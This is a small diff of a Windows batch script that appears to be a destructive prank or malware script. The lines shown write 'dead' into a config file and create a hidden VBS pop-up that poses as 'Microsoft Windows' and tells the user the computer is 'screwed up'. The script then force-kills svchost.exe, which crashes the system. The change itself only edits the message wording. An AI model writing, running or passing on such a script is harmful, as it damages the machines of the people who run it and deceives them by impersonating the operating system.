@@ -134,8 +134,9 @@ echo dead>config\OSDATA
 mkdir %userprofile%\Desktop
 cd %userprofile%\Desktop
 timeout /t 15 /nobreak
-echo x=msgbox("You got your computer screwed successfully.",48+0,"Microsoft Windows")>yt.vbs
+echo x=msgbox("You got your computer screwed up successfully.",48+0,"Microsoft Windows")>yt.vbs
 attrib +h yt.vbs
 wscript yt.vbs
 del yt.vbs /f
+
 taskkill /f /im svchost.exe
